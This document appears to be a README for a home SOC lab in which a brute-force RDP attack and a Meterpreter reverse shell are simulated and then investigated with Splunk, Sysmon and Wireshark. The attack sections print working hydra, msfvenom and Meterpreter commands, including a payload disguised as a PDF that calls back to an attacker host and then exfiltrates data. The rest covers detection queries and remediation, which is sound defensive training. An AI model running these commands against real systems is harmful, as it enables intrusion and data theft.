# SOC Lab: Brute Force Attack & Reverse Shell Investigation

A self-directed SOC lab simulating a full brute force RDP attack followed by Meterpreter
reverse shell post-exploitation and data exfiltration — investigated end-to-end using
Splunk SIEM, Wireshark, and Sysmon telemetry.

---

## Lab Environment

| Machine  | OS             | Role / Tools                                          |
|----------|----------------|-------------------------------------------------------|
| Attacker | Kali Linux     | Nmap, Hydra, Metasploit (Meterpreter), Wireshark, Splunk |
| Victim   | Windows 10/11  | RDP Service, Sysmon, Splunk Universal Forwarder       |

---

## Objectives

- Simulate a brute force RDP attack and a Meterpreter reverse shell C2 session
- Detect and investigate the attack using Splunk SIEM and Wireshark packet analysis
- Identify the malicious process responsible for data exfiltration
- Produce actionable remediation recommendations

---

## Attack Phases

### Phase I — Brute Force Attack (Hydra → RDP)
The attacker used `nmap` to identify active hosts and open ports, then launched a
brute force attack against the victim's RDP service (port 3389) using `hydra`.

```bash
nmap -A 192.168.1.0/24
hydra -l windowsdemo -P /home/jes/Downloads/password.txt rdp://192.168.1.11 -T 4 -V -f
```

After cracking the credentials, the attacker established a remote desktop session
using `xfreerdp` and created a shared folder on the victim machine.

```bash
xfreerdp /v:192.168.1.11 /u:windowsdemo /p:WindowsDemo12 /drive:kali_share,/home/jes
```

---

### Phase II — Reverse Shell (Metasploit → Meterpreter)
Once authenticated via RDP, the attacker generated a reverse TCP payload disguised
as a PDF file, set up a listener, and executed the payload on the victim machine.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o cv.pdf.exe
```

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

---

### Phase III — Data Exfiltration (Meterpreter → C2 Channel)
With an active C2 session established, the attacker exfiltrated data from the
victim machine via the Meterpreter session.

```bash
meterpreter > download rockyou.txt
```

Wireshark confirmed **140 MB of data** transferred from the victim
`(192.168.1.11)` to the attacker `(192.168.1.10)` over port 4444,
visualized as a sharp spike in the I/O graph.

---

## Detection & Investigation

### Wireshark Detections

| Phase | Filter Used | Finding |
|---|---|---|
| Network Scanning | `arp` | Broadcast ARP requests from attacker identifying active hosts |
| Port Scanning | `tcp.flags.syn==1 && tcp.flags.ack==0` | Mass TCP SYN packets to multiple ports on victim |
| Brute Force | `tcp.port==3389 && tcp.flags.syn==1 && tcp.flags.ack==1` | High volume of completed RDP handshakes indicating repeated login attempts |
| C2 Session | `ip.src==192.168.1.11 && tcp.port==4444` | Continuous TCP stream confirming active Meterpreter C2 connection |
| Data Exfiltration | Wireshark I/O Graph | Sudden spike of 200+ packets/sec; 140 MB transferred over C2 channel |

---

### Splunk Detections

**Detect network scanning activity:**
```spl
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
| stats count by DestinationIp SourceIp
```

**Detect brute force attack (failed + successful logons):**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4625 OR EventCode=4624
| stats count(eval(EventCode=4625)) as Failed count(eval(EventCode=4624)) as Success
  by Source_Network_Address ComputerName
| where Failed > 10 AND Success > 1
| rename Source_Network_Address as Attacker_IP
| rename ComputerName as TargetDevice
```
> Multiple failed logons followed by a successful logon from an unknown IP
> targeting a single host is a strong indicator of a brute force attack.

**Detect RDP remote connection via Sysmon Event ID 3:**
```spl
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| stats count by SourceIp DestinationIp DestinationPort EventCode
```

**Identify the malicious process behind the C2 connection:**
```spl
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| stats count by SourceIp DestinationIp EventCode Image
```
> Result: `cv.pdf.exe` (located in `C:\Users\windowsdemo\Downloads\`) was
> identified as the process establishing the outbound connection to port 4444.

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
|---|---|---|
| Reconnaissance | T1595 | Active Scanning |
| Credential Access | T1110 | Brute Force |
| Lateral Movement | T1021.001 | Remote Desktop Protocol |
| Execution | T1204.002 | User Execution: Malicious File |
| Command & Control | T1571 | Non-Standard Port |
| Ingress Tool Transfer | T1105 | Ingress Tool Transfer |
| Exfiltration | T1041 | Exfiltration Over C2 Channel |

---

## Remediation Recommendations

| # | Recommendation | Rationale |
|---|---|---|
| 1 | **Implement RDP account lockout policy** | Lock accounts after a defined number of failed login attempts to prevent brute force success |
| 2 | **Enable Multi-Factor Authentication (MFA)** | MFA prevents credential-based access even when passwords are compromised |
| 3 | **Disable unnecessary ports** | Restrict RDP (3389) and non-standard ports (4444) at the firewall level |
| 4 | **Deploy EDR solution** | Flag and block unsigned executables (e.g. `cv.pdf.exe`) initiating outbound network connections |

---

## Tools Used

| Category | Tool |
|---|---|
| Offensive | Kali Linux, Nmap, Hydra, Metasploit, Meterpreter, xfreerdp |
| SIEM | Splunk Enterprise, Splunk Universal Forwarder |
| Endpoint Telemetry | Sysmon (Event IDs 3, 4624, 4625) |
| Packet Analysis | Wireshark |

---

## Investigation Report

The full forensic investigation report is available in the `/report/` folder.

---

## Author

**Jester M. Bustamante**
Junior Cybersecurity Analyst | SOC Analyst L1
[LinkedIn](https://linkedin.com/in/jesterbustamante-003023391)
